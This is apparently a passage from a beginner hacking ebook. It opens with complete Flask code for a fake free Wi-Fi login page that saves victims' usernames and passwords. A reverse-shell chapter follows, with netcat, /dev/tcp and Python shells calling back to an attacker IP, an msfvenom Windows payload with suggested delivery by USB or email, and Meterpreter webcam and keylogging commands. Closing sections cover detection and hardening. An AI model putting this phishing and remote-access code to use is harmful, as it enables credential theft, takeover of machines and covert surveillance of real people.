+from flask import Flask, request, render_template_string
+
+import datetime
+
+app = Flask(__name__)
+
+# HTML login page
+
+login_page = '''
+
+<!DOCTYPE html>
+
+< html >
+
+< head >
+
+< title >Free Wi-Fi Login</ title >
+
+</ head >
+
+< body style="text-align: center; margin-top: 100px; font-family: Arial;">
+
+< h2 >Welcome to Free Wi-Fi</ h2 >
+
+< p >Please login to access the internet.</ p >
+
+< form method="POST">
+
+< input type="text" name="username" placeholder="Username or Email">< br >< br >
+
+< input type="password" name="password" placeholder="Password">< br >< br >
+
+< input type="submit" value="Login">
+
+</ form >
+
+</ body >
+
+</ html >
+
+'''
+
+@app.route('/', methods=['GET', 'POST'])
+
+def login():
+
+if request.method == 'POST':
+
+username = request.form.get('username')
+
+password = request.form.get('password')
+
+log_data(username, password)
+
+return "< h3 >Thank you! You are now connected to the internet. </ h3 >"
+
+return render_template_string(login_page)
+
+def log_data(username, password):
+
+with open("captured_credentials.txt", "a") as f:
+
+time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+f.write(f"[{time}] Username: {username}, Password: {password}\n")
+
+print(f"[+] Captured: {username} | {password}")
+
+if __name__ == '__main__':
+
+app.run(host="0.0.0.0", port=80)
+
+
+
+This Python script creates a fake Wi-Fi login page using Flask that looks like a typical free public hotspot.
+
+When someone connects and submits their login details, the script saves those credentials into a file along with the exact time they were captured. It then displays a friendly message saying the user is now connected to the internet.
+
+Run the Portal
+
+Save the code to a file (fake_captive_portal.py), then open a terminal and run:
+
+python3 fake_captive_portal.py
+
+
+
+T he fake portal page is live and available to anyone on the same network.
+
+
+
+Now, I will open Firefox browser and access the login page using my local IP address. I will type “John” for the username and ‘letmein321’ for the password.
+
+Let’s go back to the terminal where the script is running.
+
+
+
+H ere in the terminal , you can see I have successfully captured the login credentials. Those same credentials are also saved to a file named “captured_credentials.txt” in the current directory.
+
+
+
+
+
+​ Chapter 5: Reverse Shells
+
+
+
+
+I magine you're trying to control another computer on a network to demonstrate how attackers operate, so you can defend yourself better. One of the simplest ways hackers gain control over a remote machine is through something called a reverse shell.
+
+A reverse shell is like a remote control tunnel. Instead of the attacker connecting to the target machine, the target connects back to the attacker, reversing the usual direction of the connection. Once connected, the attacker gets command-line access to the target system, almost like sitting in front of it.
+
+
+
+
+
+​ How Reverse Shells Work
+
+
+
+
+T o demonstrate how a reverse shell works, I will use a tool called Netcat. It’s lightweight, powerful, and perfect for setting up reverse shells. Let’s get started.
+
+Attacker sets up a listener by typing the following command in the terminal:
+
+nc -lvnp 4444
+
+
+
+This starts a listener on port 4444. Netcat is now waiting for incoming connections.
+
+● -l tells Netcat to listen.
+
+● -v is for verbose output.
+
+● -n avoids DNS resolution (faster).
+
+● -p 4444 sets the port to listen on.
+
+
+
+Reverse Shell from Target
+
+Let’s say you somehow tricked the target into running this:
+
+nc 192.168.31.152 4444 -e /bin/bash
+
+
+
+This tells Netcat to connect back to the attacker’s IP (192.168.31.152) on port 4444, and attach /bin/bash (the shell) to the connection.
+
+Output:
+
+Listening on 0.0.0.0 4444
+
+Connection received on 192.168.10.158 51432
+
+
+
+If -e option is disabled by default for security reasons, you can try:
+
+bash -i >& /dev/tcp/<your-ip>/4444 0>&1
+
+
+
+Once connected, you'll have remote control over the target computer.
+
+Sometimes, the shell might be very basic (missing features like arrow keys or tab completion). You can upgrade it like this:
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+
+This gives you a better, more interactive shell experience.
+
+
+
+
+
+​ Creating Reverse Shells with Python
+
+
+
+
+I n this lesson, you’ll learn how to create a simple yet powerful Python reverse shell. This script allows a remote attacker to gain a shell on a target machine.
+
+The idea is simple, you run a short Python script on the target machine (the victim). This script connects back to the attacker’s machine, which is waiting and listening on a port.
+
+Once connected, the attacker can type commands as if they were sitting in front of the target’s terminal.
+
+You’ve already seen what reverse shells are. Now, it's time to build one from scratch using just a few lines of code.
+
+Set Up the Listener
+
+Before running the Python script on the target, you need to be listening for the connection. On your attacker machine, use:
+
+nc -lvnp 4444
+
+
+
+Next, create the script file with .py extension, and add the following code:
+
+import socket, subprocess, os
+
+s = socket.socket()
+
+s.connect(("ATTACKER_IP", 4444))
+
+os.dup2(s.fileno(), 0)
+
+os.dup2(s.fileno(), 1)
+
+os.dup2(s.fileno(), 2)
+
+subprocess.call(["/bin/bash"])
+
+
+
+Replace "ATTACKER_IP" with the IP address of your attacking machine, like "192.168.52.131". Once the script runs on the target machine, it will connect back, and you’ll see something like:
+
+Connection from 192.168.1.105
+
+bash: no job control in this shell
+
+$ whoami
+
+targetuser
+
+$ hostname
+
+victim-pc
+
+
+
+Now you can run any command directly on the target machine.
+
+
+
+
+
+​ Creating Reverse Shells with Metasploit
+
+
+
+
+I n this part of the book, you'll learn how to create a reverse shell that works on a Windows machine. This type of reverse connection is perfect when the target is behind a firewall, because they’re the ones making the connection to you. Let’s start.
+
+Use msfvenom to generate a Windows executable that will call back to your attacker machine:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
+
+
+
+● LHOST: your attacking machine IP.
+
+● LPORT: the port you’ll listen on.
+
+● -f exe: output format for Windows.
+
+● -o shell.exe: name of your payload.
+
+
+
+Once created, you'll need to find a way to deliver this executable to the Windows target. This could be via USB, email, or a shared folder.
+
+Start the Listener
+
+Open your terminal and type:
+
+msfconsole
+
+
+
+Then configure the handler to wait for connections:
+
+use exploit/multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 192.168.1.100
+
+set LPORT 4444
+
+run
+
+
+
+Metasploit is now listening for the moment the victim runs your shell.exe. Once the target runs shell.exe, your terminal will look like this:
+
+[*] Started reverse TCP handler on 192.168.1.100:4444
+
+[*] Sending stage...
+
+[*] Meterpreter session 1 opened
+
+meterpreter >
+
+
+
+You now have full control on the Windows machine. From here, you can explore files, take screenshots, record the microphone, and more. Here's a list of useful commands you can use:
+
+shell
+
+Drops into a regular Windows command prompt (very powerful).
+
+Example:
+
+meterpreter > shell
+
+
+
+screenshot
+
+➜ Takes a screenshot of the victim’s screen.
+
+Example:
+
+meterpreter > screenshot
+
+
+
+webcam_snap
+
+➜ Takes a photo using the victim’s webcam (if available).
+
+Example:
+
+meterpreter > webcam_snap
+
+
+
+keyscan_start
+
+➜ Begins logging keystrokes.
+
+Example:
+
+meterpreter > keyscan_start
+
+
+
+keyscan_dump
+
+➜ Shows the keystrokes captured so far.
+
+Example:
+
+meterpreter > keyscan_dump
+
+
+
+Meterpreter is packed with powerful features that go way beyond what I have covered here. Run help inside Meterpreter to see a full list of commands and start experimenting.
+
+
+
+
+
+​ Detect Reverse Shells on Linux
+
+
+
+
+I f a reverse shell is active, the system usually has an outbound connection to an unfamiliar IP and port.
+
+Try this:
+
+ps aux | grep bash
+
+
+
+Or:
+
+netstat -tunp
+
+
+
+Look for entries like this:
+
+tcp ESTABLISHED 0 0 192.168.1.50:41232 192.168.1.100:4444 users:(("bash",pid=3421,fd=3))
+
+
+
+Notice the bash process connecting to a remote machine (192.168.1.100:4444). That’s suspicious!
+
+Kill a Reverse Shell
+
+Once you've identified a suspicious reverse shell process like a bash or netcat connection that shouldn't be there, you can terminate it in a few quick steps.
+
+If you saw a suspicious connection like:
+
+tcp ESTABLISHED 0 0 192.168.1.50:45555 192.168.1.100:4444 users:(("bash",pid=2983,fd=3))
+
+
+
+Here, the PID is 2983. Once you have the PID, run:
+
+kill -9 2983
+
+
+
+The -9 flag forcefully kills the process immediately.
+
+If there are multiple suspicious processes, you can kill them all:
+
+pkill -f bash
+
+
+
+Or more selectively:
+
+pkill -f "/dev/tcp"
+
+
+
+This targets any Bash reverse shell using TCP tricks.
+
+Reverse shells can be sneaky, they often look like normal system processes at first glance. But once you know what to look for, spotting and stopping them becomes much easier.
+
+Tools like ps and netstat help you see what's happening under the hood, and a quick kill command can instantly cut off the attacker's connection.
+
+
+
+
+
+​ Chapter 6: Security
+
+
+
+
+I n this final chapter , you’ll learn to encrypt and decrypt files with GPG and hide sensitive information inside images with Steghide to keep secrets safe.
+
+You’ll also learn to spot suspicious Wi-Fi activity using Wireshark, secure your wireless network, and monitor your system logs for anything unusual.
+
+
+
+
+
+​ Encrypt and Decrypt Files With GPG
+
+
+
+
+G PG can be found in most Linux distributions out of the box. You can verify the version using ‘gpg – version’ in your terminal.
+
+For Debian and Ubuntu-based systems, install the gpg package using:
+
+apt install gpg
+
+
+
+Encrypting a File
+
+The quick method for encrypting a file is to run the gpg command with the -c (create) option.
+
+
+
+In my case, I’ll encrypt the ‘Credit-Cards.txt’ file using the following command.
+
+gpg -c Credit-Cards.txt
+
+
+
+
+
+GPG will ask you to put a password (twice) for the file that you’re encrypting.
+
+
+
+At this point, if you type the ‘ls’ command, you can see the original file intact, Credit-Cards.txt, and it adds the .gpg extension to the newly encrypted file.
+
+You should remove the original file, Credit-Cards.txt, so that the encrypted one is the only source of the information contained in it.
+
+Now let’s try to open the encrypted file using the nano text editor.
+
+nano Credit-Cards.txt.gpg
+
+
+
+
+
+I cannot read the information inside the file because it’s encrypted.
+
+Decrypting a File
+
+Decrypting means that you remove the encryption to read the file’s contents. Use the following command.
+
+gpg -d Credit-Cards.txt.gpg
+
+
+
+
+
+You will be prompted to enter the password to decrypt the file.
+
+
+
+As you can see, the text file was successfully decrypted.
+
+The gpg utility has a lot of options, but encrypting and decrypting are easy to do and only require that you know two options for quick use: Create or encrypt (-c), decrypt (-d).
+
+
+
+
+
+​ Hide Secret Data Inside an Image with Steghide
+
+
+
+
+S teghide is a steganography tool that uses a password to hide secret files within an image or audio file. BMP and JPEG picture types are supported, as well as AU and WAV audio formats.
+
+This tool is useful in situations where you want to send encrypted messages or hide personal data.
+
+Installation
+
+To install Steghide, use the following command in your Linux terminal.
+
+apt install steghide
+
+
+
+Steghide should now be installed on your system. You can use “steghide –help” command to find all the options.
+
+Embed Data in the Image
+
+In this step, I have created a simple text file (secretpass.txt) with some passwords, which I will embed in my image file (warcraft3.jpg).
+
+
+
+To embed the file, use the following command:
+
+steghide embed -ef secretpass.txt -cf warcraft3.jpg -p letmein
+
+
+
+The arguments are broken down as follows:
+
+● -ef specifies the file that you want to hide. In my case is “secretpass.txt”
+
+● -cf is the file that the data is embedded into. In this example, I am embedding in an image file called “warcraft3.jpg”.
+
+● -p is to specify a password. The password will be required for anyone trying to extract the data from the image.
+
+
+
+
+
+The text file is now embedded in the image.
+
+Extract Data from the Image
+
+To extract the hidden data, use the following command:
+
+steghide extract -sf warcraft3.jpg -p letmein
+
+
+
+
+
+Here, you can see I have extracted “secretpass.txt” from the “warcraft3.jpg” image. The embedded text file will be extracted and written to your current directory.
+
+You can use “ls” command to see the file. Now I will open “secretpass.txt” file using the nano text editor.
+
+nano secretpass.txt
+
+
+
+
+
+As you can see, this file contains my secret passwords.
+
+It literally only takes a moment to hide secret messages or passwords inside media files.
+
+
+
+
+
+​ Detect Malicious Wi-Fi Attacks with Wireshark
+
+
+
+
+D ue to weaknesses in the way Wi-Fi works, it’s extremely easy to disrupt most Wi-Fi networks using tools that forge deauthentication packets.
+
+Most common tools like aireplay-ng or MDK3 do this by flooding a target with deauthentication packets, which will disconnect any client from the network at any time. Doing so requires only a wireless network adapter that can be put into monitor mode, and a simple command.
+
+To get started detecting these attacks, I will be using Wireshark to sniff packets in the area and separate the types of packets with filtering. If you don’t have Wireshark, you can download the tool for free at wireshark.org.
+
+Capture Packets with Wireshark
+
+Open your Linux terminal and type “wireshark”, you’ll see the menu below.
+
+
+
+First, select the network interface you’ll be using to capture packets. In my case, I’m using wlan0mon. Then click “Start capturing packets” in the top left corner.
+
+For this example, let’s pretend the attacker will use aireplay-ng to kick wireless clients from the access point (router) using the following command.
+
+aireplay-ng -0 0 -a 3A:43:3D:BF:B1:90 wlan0mon
+
+
+
+
+
+- 0 means deauthentication.
+
+-a 3A:43:3D:BF:B1:90 is the MAC address of the access point.
+
+wlan0mon is the wireless interface name in monitor mode.
+
+Now let’s go back to Wireshark and stop the capturing process. To detect and find deauthentication packets on wireless networks, use the following filter.
+
+wlan.fc.type_subtype == 12
+
+
+
+
+
+At this point, you will know that someone is trying to deauthenticate other clients from the network in order to make them re-authenticate and collect the WPA/ WPA2 4-way handshake while they are re-authenticating.
+
+This is a known technique for breaking into PSK (pre-shared key) based wireless networks. Once the attacker collects the 4-way WPA handshake, the attacker can then try to crack it and obtain the clear text password and access the network.
+
+Wireshark is a great way of visualizing Wi-Fi attacks and allows anyone to see when an attack is present and what kind of Wi-Fi packets are involved with a minimum of work.
+
+
+
+
+
+​ Secure Your Wi-Fi from Brute-Force Attacks
+
+
+
+
+O ne of the easiest ways hackers break into Wi-Fi networks is by using brute-force or wordlist attacks, where they run massive lists of common passwords against your network until they find the right one.
+
+Therefore, you need to consider implementing some changes on your router to protect yourself from intruders.
+
+Switch to WPA3
+
+The first line of defense is using WPA3, the latest Wi-Fi security protocol.
+
+WPA3 is designed to protect against offline dictionary attacks, where an attacker attempts to guess the password repeatedly. This is achieved through stronger encryption.
+
+Even if a weak password is used, WPA3’s encryption methods make it significantly harder for attackers to crack the password.
+
+Enable WPA3
+
+● Open your browser and go to your router’s IP address (often 192.168.0.1 or 192.168.1.1).
+
+● Log in with your admin credentials.
+
+● Go to Wireless Settings or Security Settings.
+
+● Change the security mode from WPA2 to WPA3-Personal.
+
+● Save your changes and reconnect your devices.
+
+
+
+
+
+So, upgrading to WPA3, if supported by your router and devices, is a recommended step to ensure the highest level of security for your wireless network.
+
+Create a Complex Password
+
+WPA3 alone won’t save you if your password is something weak like qwerty or superwifi. Hackers use wordlists with millions of common passwords.
+
+Build a strong password by mixing upper and lowercase letters, numbers, and symbols, and aim for 16 characters or more.
+
+● Great example: D7$f!wAq9@rPz3Lk
+
+● Bad example: mypassword2025
+
+
+
+The longer and more random your password, the harder it becomes for even powerful computers to crack it.
+
+By combining WPA3 encryption with a truly complex, random password, you’re making life incredibly difficult for anyone trying to brute-force their way into your network.
+
+
+
+
+
+​
+
+
+
+
+
+​ Keep an Eye on Your Logs
+
+
+
+
+O ne of the smartest ways to protect your Linux system is by keeping an eye on your logs. Whenever something happens (a login attempt, a new process, a strange error), it usually gets recorded in /var/log.
+
+You can read logs with the following commands:
+
+cat /var/log/auth.log
+
+
+
+To watch logs in real time, use:
+
+tail -f /var/log/auth.log
+
+
+
+See failed login attempts:
+
+grep "Failed password" /var/log/auth.log
+
+
+
+Example output:
+
+May 20 10:22:33 kali sshd[3456]: Failed password for root from 192.168.1.100 port 53421 ssh2
+
+
+
+Use Logwatch to Summarize Logs
+
+You don’t always want to read logs line-by-line. That’s where Logwatch comes in. It summarizes log activity in daily emails, so you can monitor weird behavior.
+
+Install it with:
+
+apt install logwatch
+
+
+
+Then run:
+
+logwatch—detail high—mailto you@example.com—range today
+
+
+
+T his will show you summaries like:
+
+SSH :
+
+Invalid login attempts: 12
+
+Successful logins: 2
+
+Apache :
+
+404 errors: 20
+
+Suspicious requests: 3
+
+
+
+You’ll get a full summary of any weird errors, login attempts, or system events for the day.
+
+Bottom Line
+
+You’ve made it to the end of the book, and that’s something to be proud of! Over these chapters, you’ve gone from basic Linux commands to mastering advanced hacking techniques.
+
+You learned how to break into Wi-Fi networks, crack password hashes, and create your own tools with Python. You explored the power of reverse shells and discovered ways to hide and protect your sensitive data.
+
+By now, you should have a solid foundation to understand how hackers think and the skills to better secure your own systems.
+
+Thank you!
+
+
+
+
+
